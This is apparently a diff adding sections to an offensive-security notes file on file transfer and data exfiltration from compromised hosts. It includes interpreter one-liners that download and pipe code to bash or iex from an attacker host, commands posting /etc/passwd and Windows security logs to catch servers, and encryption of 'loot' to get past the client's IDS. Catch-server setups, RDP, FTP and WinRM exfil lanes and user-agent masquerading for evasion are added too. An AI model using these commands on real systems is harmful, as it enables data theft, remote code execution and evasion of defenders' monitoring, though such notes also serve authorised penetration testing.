@@ -367,3 +367,182 @@ curl.exe -s -o NUL -F files=@C:\Windows\System32\winevt\Logs\Security.evtx http:
   clear it. Take the one transfer, then switch to the push lane.
 
 <!-- promoted-slug: exfil-push-uploadserver -->
+
+## Encrypt files before transfer (protected transfers)
+
+Exfiltrating loot over a plaintext channel hands sensitive content (creds, hashes) to the client's IDS. Encrypt at rest first, transfer the ciphertext, decrypt on the attacker box.
+
+Linux, openssl with a password (no cert needed):
+
+```sh
+openssl enc -aes256 -iter 100000 -pbkdf2 -in loot.txt -out loot.enc
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in loot.enc -out loot.txt
+```
+
+Windows, PowerShell (function `Invoke-AESEncryption.ps1`, part of the DRTools gallery package; AES-256-CBC, key = SHA256 of passphrase, IV prepended, output suffix `.aes`):
+
+```powershell
+Import-Module .\Invoke-AESEncryption.ps1
+Invoke-AESEncryption -Mode Encrypt -Key "passphrase" -Path .\loot.txt   # -> loot.txt.aes
+Invoke-AESEncryption -Mode Decrypt -Key "passphrase" -Path .\loot.txt.aes
+```
+
+It also encrypts/decrypts strings directly (`-Mode Encrypt -Key k -Text s` returns base64 ciphertext), handy for small secrets through text-only channels. Pair with the base64 POST-over-netcat trick for channels that only carry text.
+
+<!-- promoted-slug: file-transfer-encrypted-exfil -->
+
+## Non-interactive FTP download via command file
+
+Non-interactive shells (no prompt for the FTP password) break the stock `ftp` client. Write the session into a file and feed it with `-s:`; `-n` suppresses autologin, `-v` shows the dialog:
+
+```powershell
+echo open LHOST > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo GET file.txt >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+```
+
+`binary` matters before GET or binaries arrive corrupted. For uploads to an attacker FTP server, remember `python3 -m pyftpdlib --port 21` needs `--write` added or PUT/stor fails.
+
+<!-- promoted-slug: file-transfer-ftp-commandfile -->
+
+## Transfers via installed interpreters (no curl/wget needed)
+
+When the usual transfer binaries are missing, any interpreter already on the box can fetch or push files. Try these before uploading new tooling.
+
+Python:
+
+```sh
+python3 -c 'import urllib.request;urllib.request.urlretrieve("http://LHOST:8000/tool.sh", "tool.sh")'
+python2.7 -c 'import urllib;urllib.urlretrieve("http://LHOST:8000/tool.sh", "tool.sh")'
+# push to an uploadserver instance:
+python3 -c 'import requests;requests.post("http://LHOST:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+PHP (needs allow_url_fopen for URL wrappers; `-r` runs a one-liner):
+
+```sh
+php -r '$f = file_get_contents("http://LHOST:8000/tool.sh"); file_put_contents("tool.sh",$f);'
+php -r 'foreach (@file("http://LHOST:8000/tool.sh") as $l) { echo $l; }' | bash
+```
+
+Ruby and Perl:
+
+```sh
+ruby -e 'require "net/http"; File.write("tool.sh", Net::HTTP.get(URI.parse("http://LHOST:8000/tool.sh")))'
+perl -e 'use LWP::Simple; getstore("http://LHOST:8000/tool.sh", "tool.sh");'
+```
+
+Windows scripting hosts (no PowerShell needed; save then run with cscript):
+
+```text
+cscript.exe /nologo wget.js http://LHOST:8000/tool.ps1 tool.ps1
+cscript.exe /nologo wget.vbs http://LHOST:8000/tool.ps1 tool.ps1
+```
+
+wget.js core: `WinHttp.WinHttpRequest.5.1` GET, write `ResponseBody` through `ADODB.Stream` (Type 1) with `SaveToFile`. wget.vbs core: same flow via `Microsoft.XMLHTTP` and `Adodb.Stream` (`savetofile ..., 2`). Both take URL and output path as arguments.
+
+<!-- promoted-slug: file-transfer-language-oneliners -->
+
+## Attacker-side catch servers beyond uploadserver
+
+Nginx with PUT (WebDAV methods) accepts uploads with zero Python deps and, unlike Apache+PHP, will not execute whatever lands in the upload dir:
+
+```sh
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory && sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+```
+
+```text
+# /etc/nginx/sites-available/upload.conf
+server {
+    listen 9001;
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+```
+
+```sh
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo systemctl restart nginx.service        # port 80 conflict: remove sites-enabled/default
+curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt   # client side
+```
+
+Verify directory listing stays OFF for the upload path (Nginx default is off; Apache lists dirs lacking index.html, which exposes every exfiled file).
+
+uploadserver over TLS, for networks where plaintext HTTP would itself stand out:
+
+```sh
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+python3 -m uploadserver 443 --server-certificate server.pem
+```
+
+Quick throwaway web servers when Python is absent: `php -S 0.0.0.0:8000`, `ruby -run -ehttpd . -p8000`.
+
+<!-- promoted-slug: file-transfer-nginx-put-catcher -->
+
+## RDP drive redirection as a transfer lane
+
+With an interactive RDP session, mount an attacker-side folder into the session and copy both directions; no protocol beyond RDP/3389 needed.
+
+```sh
+rdesktop TARGET_IP -d DOMAIN -u user -p 'pass' -r disk:share='/home/user/files'
+xfreerdp /v:TARGET_IP /u:user /p:'pass' /drive:share,/home/user/files
+```
+
+Inside the session the share appears under `\\tsclient\share`; copy to and from it in Explorer or cmd. From Windows, mstsc.exe offers the same under Local Resources, Drives (More...).
+
+Notes: the redirected drive is private to that RDP session, other logged-on users on the target cannot reach it even by hijacking the session; headless freerdp RAIL/RemoteApp mounts can crash on a virtual display, use the full-desktop `/drive` form.
+
+<!-- promoted-slug: file-transfer-rdp-drive-mount -->
+
+## User-agent fingerprints of Windows transfer methods
+
+Each Windows downloader announces itself differently to the catch server; know the fingerprints to pick the one that blends (blue-team view: hunt for the anomalous ones in SIEM).
+
+| Client method | UA seen server-side |
+|---|---|
+| Invoke-WebRequest / Invoke-RestMethod | `WindowsPowerShell/5.1...` (loud) |
+| WinHttp.WinHttpRequest COM | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
+| Msxml2.XMLHTTP COM | full IE UA (`MSIE 7.0; ... Trident/7.0`) , blends as browser |
+| certutil -urlcache / -verifyctl | `Microsoft-CryptoAPI/10.0` |
+| BITS (Start-BitsTransfer) | `Microsoft BITS/7.8`, sent on a HEAD probe first |
+
+Msxml2.XMLHTTP is the quiet default when UA blacklisting is in play; run the same download through it:
+
+```powershell
+$h = New-Object -ComObject Msxml2.XMLHTTP
+$h.open('GET','http://LHOST/nc.exe',$false); $h.send(); iex $h.responseText
+```
+
+To masquerade actively, PowerShell ships preset browser UAs (InternetExplorer, FireFox, Chrome, Opera, Safari):
+
+```powershell
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{l='UA';e={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}}
+Invoke-WebRequest http://LHOST/nc.exe -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -OutFile nc.exe
+```
+
+Gotcha: base64 paste transfers die silently above roughly 8k because cmd.exe caps a command line at 8191 characters; chunk large files or use another lane.
+
+<!-- promoted-slug: file-transfer-useragent-fingerprints -->
+
+## File copy over PowerShell Remoting sessions (WinRM)
+
+When HTTP, HTTPS and SMB are all blocked between two Windows hosts, WinRM (TCP/5985 HTTP, TCP/5986 HTTPS) often still works and carries files natively via PSSession. Needs admin rights, membership in `Remote Management Users`, or explicit session-config permission on the far host.
+
+```powershell
+# Confirm WinRM reachability first
+Test-NetConnection -ComputerName TARGET -Port 5985
+
+# Open a session and move files both directions
+$Session = New-PSSession -ComputerName TARGET
+Copy-Item -Path C:\tools\tool.exe -ToSession $Session -Destination C:\Users\Public\
+Copy-Item -Path "C:\Users\Public\loot.txt" -Destination C:\ -FromSession $Session
+```
+
+Useful as a lateral exfil lane too: pull files FROM a session onto the box you occupy, then relay them out with any egress lane. If the current user already has rights on the far host, no `-Credential` is needed; otherwise pass one.
+
+<!-- promoted-slug: file-transfer-winrm-session -->
